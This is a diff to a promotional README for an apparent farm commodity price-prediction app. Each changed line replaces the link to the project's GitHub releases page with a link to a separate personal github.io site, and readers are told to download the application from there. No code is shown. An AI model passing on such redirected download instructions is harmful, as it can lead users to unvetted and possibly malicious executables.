@@ -1,6 +1,6 @@
 # 📈 agriprice-ai-commodity-price-analytics - Predict Farm Prices with Confidence
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge)](https://github.com/eraae4305-cpu/agriprice-ai-commodity-price-analytics/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge)](https://eraae4305-cpu.github.io)
 
 ## 🎯 What Is This?
 
@@ -18,7 +18,7 @@ This section walks you through everything you need to get agriprice-ai running o
 
 Click the big green button above or use this link:
 
-👉 **[https://github.com/eraae4305-cpu/agriprice-ai-commodity-price-analytics/releases](https://github.com/eraae4305-cpu/agriprice-ai-commodity-price-analytics/releases)**
+👉 **[https://eraae4305-cpu.github.io](https://eraae4305-cpu.github.io)**
 
 Visit this link to download the application. Once you're on the page, look for the latest version listed. Click on the download button next to it. Your browser will start downloading a file to your computer (usually to your "Downloads" folder).
 
@@ -182,7 +182,7 @@ Check the GitHub releases page for detailed version history and upcoming feature
 
 You don't need a degree in economics or computer science to benefit from price predictions. agriprice-ai brings professional-grade commodity analytics to your desktop—free, simple, and ready to use.
 
-[🚀 Download Now](https://github.com/eraae4305-cpu/agriprice-ai-commodity-price-analytics/releases)
+[🚀 Download Now](https://eraae4305-cpu.github.io)
 
 Join countless users who are making smarter decisions with better data. Your next profitable insight is just a download away.
 
